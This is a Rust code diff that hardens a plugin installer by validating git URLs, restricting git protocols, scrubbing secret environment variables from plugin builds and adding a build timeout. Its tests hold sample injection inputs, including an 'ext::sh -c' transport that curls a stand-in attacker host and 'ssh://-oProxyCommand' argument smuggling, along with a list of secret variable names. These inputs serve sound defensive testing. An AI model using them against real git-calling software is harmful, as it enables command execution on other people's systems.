@@ -1,13 +1,17 @@
 use std::fs;
 use std::io::Write;
 use std::path::{Path, PathBuf};
-use std::process::{Command, Stdio};
-use std::time::{SystemTime, UNIX_EPOCH};
+use std::process::{Child, Command, Stdio};
+use std::thread;
+use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};
 
 use serde::{Deserialize, Serialize};
 use serde_json::{Value, json};
 
 use crate::config::{self, SidebarPluginConfig};
+
+/// A userland plugin build must not hold the CLI forever.
+const PLUGIN_BUILD_TIMEOUT: Duration = Duration::from_secs(300);
 
 #[derive(Debug, Clone, Default)]
 pub struct CliOptions {
@@ -147,6 +151,8 @@ fn install_command(positionals: &[String], options: &CliOptions) -> Result<Value
     if positionals[1].is_empty() {
         return Err(ManagerError::validation(Some("git_url"), "plugin git URL must not be empty"));
     }
+    validate_git_source(&positionals[1])
+        .map_err(|error| ManagerError::validation(Some("git_url"), error.to_string()))?;
     let root = install_root()?;
     fs::create_dir_all(&root)?;
     let temp_dir = root.join(format!(".install-{}-{}", std::process::id(), now_nanos()));
@@ -417,6 +423,167 @@ fn validate_plugin_name(name: &str) -> anyhow::Result<()> {
     Ok(())
 }
 
+fn validate_git_source(source: &str) -> anyhow::Result<()> {
+    if source.is_empty() {
+        anyhow::bail!("plugin git URL must not be empty");
+    }
+    if source.bytes().any(|byte| byte == 0 || byte.is_ascii_control()) {
+        anyhow::bail!("plugin git URL must not contain NUL or control characters");
+    }
+    if source.starts_with('-') {
+        anyhow::bail!("plugin git URL must not start with '-'");
+    }
+    if let Some(separator) = source.find("::") {
+        // Git's custom transport syntax is `<protocol>::<address>`. Require
+        // a protocol-shaped prefix, and ignore separators inside a URL's
+        // authority or path (for example, an IPv6 literal).
+        let protocol = &source[..separator];
+        if !protocol.is_empty()
+            && !protocol.contains("://")
+            && protocol.bytes().enumerate().all(|(index, byte)| {
+                byte.is_ascii_alphanumeric() || (index > 0 && matches!(byte, b'+' | b'-' | b'.'))
+            })
+            && protocol.bytes().next().is_some_and(|byte| byte.is_ascii_alphabetic())
+        {
+            anyhow::bail!("plugin git URL must not use a custom Git transport");
+        }
+    }
+
+    // Git receives this value as a process argument. Reject URL forms that
+    // can carry a password or token so credentials do not enter the process
+    // table, shell history, or Git's diagnostic output. SSH user names remain
+    // valid because `ssh://git@host/repo` is a normal key-based source.
+    if let Some(scheme_end) = source.find("://") {
+        let scheme = &source[..scheme_end];
+        if !matches!(
+            scheme.to_ascii_lowercase().as_str(),
+            "file" | "git" | "http" | "https" | "ssh"
+        ) {
+            anyhow::bail!("unsupported plugin git URL scheme {scheme:?}");
+        }
+        let authority_start = scheme_end + 3;
+        let authority_end = source[authority_start..]
+            .find(['/', '?', '#'])
+            .map_or(source.len(), |offset| authority_start + offset);
+        let authority = &source[authority_start..authority_end];
+        let suffix = &source[authority_end..];
+        if suffix.contains(['?', '#']) {
+            anyhow::bail!("plugin git URL must not contain a query or fragment");
+        }
+        let host = authority.rsplit_once('@').map_or(authority, |(_, host)| host);
+        if host.starts_with('-') {
+            anyhow::bail!("plugin git URL host must not start with '-'");
+        }
+        if let Some((userinfo, _host)) = authority.rsplit_once('@') {
+            // Only a plain SSH username is permitted. Every other URL
+            // userinfo form can carry credentials and would leak via argv or
+            // Git diagnostics.
+            if !scheme.eq_ignore_ascii_case("ssh")
+                || userinfo.starts_with('-')
+                || userinfo.contains([':', '%'])
+            {
+                anyhow::bail!("plugin git URL must not contain embedded credentials");
+            }
+        }
+    } else if !is_local_git_path(source)
+        && let Some(at) = source.find('@')
+    {
+        // Also cover scp-like sources such as `user:password@host:path`.
+        // A plain `git@host:path` remains valid.
+        let component_start = source[..at].rfind(['/', '\\']).map_or(0, |index| index + 1);
+        if source[component_start..at].contains(':') {
+            anyhow::bail!("plugin git URL must not contain embedded credentials");
+        }
+    }
+    Ok(())
+}
+
+fn is_sensitive_env_name(name: &str) -> bool {
+    let name = name.to_ascii_uppercase();
+    name.contains("TOKEN")
+        || name.contains("PASSWORD")
+        || name.contains("SECRET")
+        || name.contains("PRIVATE_KEY")
+        || name.contains("ACCESS_KEY")
+        || name.contains("AUTH_SOCK")
+        || name == "DOCKER_AUTH_CONFIG"
+        || name == "API_KEY"
+        || name.ends_with("_API_KEY")
+        || name == "AUTHORIZATION"
+}
+
+fn is_local_git_path(source: &str) -> bool {
+    source.starts_with('/')
+        || source.starts_with("./")
+        || source.starts_with("../")
+        || source.starts_with("~/")
+        || (source.len() >= 3
+            && source.as_bytes()[0].is_ascii_alphabetic()
+            && source.as_bytes()[1] == b':'
+            && matches!(source.as_bytes()[2], b'/' | b'\\'))
+}
+
+fn is_safe_plugin_build_env_name(name: &str) -> bool {
+    matches!(
+        name,
+        "PATH"
+            | "HOME"
+            | "TMPDIR"
+            | "LANG"
+            | "LC_ALL"
+            | "LC_CTYPE"
+            | "TERM"
+            | "CI"
+            | "RUSTUP_HOME"
+            | "RUSTUP_TOOLCHAIN"
+            | "CARGO_HOME"
+            | "CARGO_BUILD_TARGET"
+            | "RUSTFLAGS"
+    ) || name.starts_with("LC_")
+}
+
+fn scrub_plugin_build_environment(command: &mut Command) {
+    for (key, _) in std::env::vars_os() {
+        if !is_safe_plugin_build_env_name(&key.to_string_lossy()) {
+            command.env_remove(key);
+        }
+    }
+}
+
+fn kill_plugin_build_process(child: &mut Child) {
+    #[cfg(unix)]
+    {
+        if let Ok(group) = libc::pid_t::try_from(child.id()) {
+            // The build runs in its own process group, so a timeout also
+            // removes descendants such as package-manager subprocesses.
+            // SAFETY: this is the process group created for this child.
+            unsafe {
+                libc::kill(-group, libc::SIGKILL);
+            }
+        }
+    }
+    let _ = child.kill();
+}
+
+fn run_plugin_build_command(command: &mut Command, timeout: Duration) -> anyhow::Result<()> {
+    let mut child = command.spawn()?;
+    let deadline = Instant::now() + timeout;
+    loop {
+        if let Some(status) = child.try_wait()? {
+            if !status.success() {
+                anyhow::bail!("build command failed with status {status}");
+            }
+            return Ok(());
+        }
+        if Instant::now() >= deadline {
+            kill_plugin_build_process(&mut child);
+            let _ = child.wait();
+            anyhow::bail!("build command timed out after {:.1} seconds", timeout.as_secs_f64());
+        }
+        thread::sleep(Duration::from_millis(100));
+    }
+}
+
 fn installed_name(
     manifest: &PluginManifest,
     override_name: Option<&str>,
@@ -432,16 +599,15 @@ fn installed_name(
 
 fn run_build_if_needed(manifest: &PluginManifest, dir: &Path) -> anyhow::Result<()> {
     let Some(build) = &manifest.build else { return Ok(()) };
-    let status = Command::new(&build.command[0])
-        .args(&build.command[1..])
-        .current_dir(dir)
-        .stdout(Stdio::null())
-        .stderr(Stdio::null())
-        .status()?;
-    if !status.success() {
-        anyhow::bail!("build command failed with status {status}");
+    let mut command = Command::new(&build.command[0]);
+    command.args(&build.command[1..]).current_dir(dir).stdout(Stdio::null()).stderr(Stdio::null());
+    #[cfg(unix)]
+    {
+        use std::os::unix::process::CommandExt;
+        command.process_group(0);
     }
-    Ok(())
+    scrub_plugin_build_environment(&mut command);
+    run_plugin_build_command(&mut command, PLUGIN_BUILD_TIMEOUT)
 }
 
 fn resolved_run_command(manifest: &PluginManifest, dir: &Path) -> anyhow::Result<Vec<String>> {
@@ -477,7 +643,24 @@ fn run_git<const N: usize>(
     current_dir: Option<&Path>,
 ) -> anyhow::Result<()> {
     let mut command = Command::new("git");
-    command.args(["-c", "protocol.file.allow=always"]).args(args);
+    command
+        .args([
+            "-c",
+            "protocol.allow=never",
+            "-c",
+            "protocol.ext.allow=never",
+            "-c",
+            "protocol.file.allow=always",
+            "-c",
+            "protocol.ssh.allow=always",
+            "-c",
+            "protocol.git.allow=always",
+            "-c",
+            "protocol.http.allow=always",
+            "-c",
+            "protocol.https.allow=always",
+        ])
+        .args(args);
     if let Some(path) = final_arg_path {
         command.arg(path);
     }
@@ -825,5 +1008,72 @@ mod tests {
             sanitized_git_source("git@example.com:team/plugin.git"),
             "git@example.com:team/plugin.git"
         );
+    }
+
+    #[test]
+    fn git_source_rejects_custom_transports_and_helpers() {
+        for source in [
+            "ext::sh -c 'curl https://attacker.invalid'",
+            "hg::https://example.com/team/plugin",
+            "ftp://example.com/team/plugin.git",
+            "git://token@example.com/team/plugin.git",
+            "--separate-git-dir=/tmp/attacker",
+            "ssh://-oProxyCommand=id/repo.git",
+            "ssh://git@-oProxyCommand=id/repo.git",
+            "ssh://-oProxyCommand=id@trusted-host/repo.git",
+        ] {
+            assert!(
+                validate_git_source(source).is_err(),
+                "custom Git transport must be rejected: {source}"
+            );
+        }
+        assert!(validate_git_source("/tmp/plugin:variant@repo").is_ok());
+        assert!(validate_git_source("C:\\tmp\\plugin:variant@repo").is_ok());
+        assert!(validate_git_source("https://[2001:db8::1]/team/plugin.git").is_ok());
+        assert!(validate_git_source("ssh://git@[::1]/team/plugin.git").is_ok());
+    }
+
+    #[test]
+    fn plugin_build_environment_scrubs_secret_values() {
+        for name in [
+            "GITHUB_TOKEN",
+            "AWS_SECRET_ACCESS_KEY",
+            "SERVICE_PASSWORD",
+            "OPENAI_API_KEY",
+            "SSH_PRIVATE_KEY",
+            "AWS_ACCESS_KEY_ID",
+            "DOCKER_AUTH_CONFIG",
+            "SSH_AUTH_SOCK",
+        ] {
+            assert!(is_sensitive_env_name(name), "secret environment name: {name}");
+            assert!(!is_safe_plugin_build_env_name(name), "secret environment name: {name}");
+        }
+        for name in ["PATH", "HOME", "RUSTUP_HOME"] {
+            assert!(!is_sensitive_env_name(name), "build environment name: {name}");
+        }
+        assert!(is_safe_plugin_build_env_name("PATH"));
+        assert!(is_safe_plugin_build_env_name("LC_CTYPE"));
+        for name in
+            ["RUSTUP_HOME", "RUSTUP_TOOLCHAIN", "CARGO_HOME", "CARGO_BUILD_TARGET", "RUSTFLAGS"]
+        {
+            assert!(is_safe_plugin_build_env_name(name), "toolchain environment name: {name}");
+        }
+    }
+
+    #[test]
+    fn plugin_build_timeout_is_finite_and_positive() {
+        assert!(PLUGIN_BUILD_TIMEOUT.as_nanos() > 0);
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn plugin_build_command_terminates_after_timeout() {
+        let mut command = std::process::Command::new("sh");
+        command.args(["-c", "while :; do :; done"]);
+        let started = std::time::Instant::now();
+        let error = run_plugin_build_command(&mut command, std::time::Duration::from_millis(20))
+            .expect_err("a busy build must time out");
+        assert!(started.elapsed() < std::time::Duration::from_secs(2));
+        assert!(error.to_string().contains("timed out"));
     }
 }
